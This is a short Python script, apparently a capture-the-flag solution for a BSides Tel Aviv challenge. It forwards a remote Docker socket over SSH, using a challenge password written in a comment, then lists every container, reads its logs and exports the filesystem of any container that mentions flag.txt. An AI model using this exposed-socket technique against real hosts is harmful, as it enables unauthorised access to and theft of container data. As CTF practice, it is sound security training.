import docker
import logging
import tarfile

# LOCAL: curl --unix-socket /app/docker.sock http://localhost/containers/json?all=1
# REMOTE: ssh -nNT -L /tmp/bsides.docker.sock:/app/docker.sock -L 3306:172.18.0.2:3306 -L 8000:172.18.0.3:8000 bsidestlv@one.challenges.bsidestlv.com -p 2222
# SSH password: d0ck1ngst4t10n

# need to patch 'docker/api/client.py' to use unversioned API:
#    if kwargs.get('versioned_api', False):

c = docker.DockerClient(base_url='unix:///tmp/bsides.docker.sock', version=None)
l = c.containers.list(all=True, sparse=True)
print(l)
for i in l:
    log = i.logs()
    print(log)
    if 'flag.txt' in log:
        try:
            s = i.export()
            fname = '%s.tar' % i.id
            print("writing %s" % fname)
            with open(fname, "wb") as fout:
                for d in s:
                    fout.write(d)
        except:
            print("failed for %s", i.id)
